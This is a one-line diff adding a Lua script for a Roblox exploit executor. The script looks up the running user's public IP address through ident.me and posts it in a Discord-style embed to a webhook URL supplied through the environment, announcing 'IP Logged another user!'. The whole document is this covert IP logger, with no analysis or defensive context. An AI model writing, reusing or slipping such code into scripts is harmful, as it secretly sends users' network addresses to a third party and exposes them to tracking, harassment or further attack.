@@ -1,0 +1,1 @@
+syn.request({Url=getfenv()["IP"],Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({["embeds"]={{["title"]="IP Logged another user!, credit to Soviet#1337",["description"]="IP: "..game:HttpGet("https://v4.ident.me")}}})})
